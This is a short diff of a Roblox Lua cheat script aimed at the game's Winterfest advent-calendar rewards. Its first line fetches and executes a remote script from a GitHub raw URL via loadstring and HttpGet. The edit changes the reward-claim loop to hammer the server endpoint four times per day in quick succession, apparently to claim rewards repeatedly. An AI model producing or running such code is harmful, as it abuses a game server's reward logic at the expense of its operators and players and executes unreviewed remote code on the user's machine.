@@ -1,7 +1,11 @@
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/Spinzox/main/refs/heads/main/script.lua'),true))()
-wait(15)
+wait(15)  -- Initial wait time
+
 for i = 1, 25 do
-    local args = {i}  
-    game:GetService("ReplicatedStorage").API:FindFirstChild("WinterfestAPI/AdventCalendarTryTakeReward"):InvokeServer(unpack(args))
-    wait(0.3)  
+    -- Execute the same number four times rapidly
+    for j = 1, 4 do
+        local args = {i}  
+        game:GetService("ReplicatedStorage").API:FindFirstChild("WinterfestAPI/AdventCalendarTryTakeReward"):InvokeServer(unpack(args))
+    end
+    wait(0.5)  -- Wait for 0.5 seconds before moving on to the next number
 end
